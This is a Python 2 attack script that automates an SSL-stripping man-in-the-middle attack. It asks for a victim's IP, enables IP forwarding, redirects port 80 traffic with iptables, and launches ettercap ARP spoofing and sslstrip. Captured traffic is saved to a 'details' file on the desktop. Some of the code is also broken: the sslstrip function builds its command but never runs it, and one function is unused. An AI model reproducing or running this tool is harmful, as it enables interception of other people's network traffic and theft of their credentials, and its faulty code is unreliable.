#! /usr/bin/python2

import os
import commands
import time
import signal
import random
import thread


def a():

	def abc():
		while (2<3):
			print "hii"	

	def ssl(r):
		www=("sslstrip -l "+r+" > /dev/null")

	def ettercap(x):
		l=commands.getoutput("ettercap -i wlan0 -T -M arp:remote "+x+" > /root/Desktop/details.txt")


	def my(x,y):
		os.system("dialog --no-shadow --infobox 'SSL Stripping Stopped.\nThank You.\nBringing details. ' 10 40")
		time.sleep(1)
		os.system("killall ettercap")
		os.system("killall sslstrip")
		os.system("iptables -F")
		os.system("dialog --no-shadow --msgbox 'The Details are stored at /root/Desktop/details.txt' 10 40")		
		os.system("dialog --no-shadow --textbox /root/Desktop/details.txt 20 80")
			
	  

	signal.signal(2,my)

	f=open('/root/Desktop/dump/ip','w')
	f.write('/')
	f.close()	
	os.system("dialog --no-shadow --title 'SSL Stripping' --inputbox 'Enter the IP of Victim' 10 50 2>> /root/Desktop/dump/ip")
	ro=commands.getoutput("route -n | grep UG | awk '{print $2}'")
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
	os.system("iptables -F")
	rand=random.randint(5000,10000)
	r=str(rand)
	os.system("iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port "+r)
	f=open('/root/Desktop/dump/ip','a')
	f.write('/ /')
	f.close()
	ro=commands.getoutput("route -n | grep UG | awk '{print $2}'")
	f=open('/root/Desktop/dump/ip','a')
	f.write(ro)
	f.write('/')			
	f.close()
	f=open('/root/Desktop/dump/ip','r')
	x=f.read()
	os.system("dialog --no-shadow --infobox 'The SSL Stripping Process is going on.. \nPress Ctrl + C to stop spoofing and view the report. ' 10 40")
	thread.start_new_thread(ssl,(r,))
	thread.start_new_thread(ettercap,(x,))
	raw_input()


